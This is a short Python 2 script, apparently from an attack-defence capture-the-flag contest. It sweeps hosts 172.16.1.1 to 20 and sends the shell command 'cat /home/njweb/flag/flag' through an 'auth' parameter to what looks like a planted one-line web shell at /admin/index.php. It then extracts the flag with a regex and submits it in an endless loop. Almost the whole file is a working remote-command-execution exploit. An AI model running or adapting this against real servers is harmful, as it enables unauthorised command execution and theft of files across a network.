
import requests
import submit
import re
from time import sleep

mat = re.compile(".*([0-9a-zA-Z]{60}).*")

payload = "http://172.16.1.%d:20003/admin/index.php"

exploit_list = []

for i in range (1,21):
    if i == 8:
        continue
    exploit_list.append(payload %(i))

def crack_oneword():
    for i in exploit_list:
        r = requests.get(i, params={"auth": 'cat /home/njweb/flag/flag'})
        m = mat.findall(r.content)
        if len(m) > 0 :
            print m[0]
            submit.submit(m[0])

while True:
    crack_oneword()
    sleep(50)

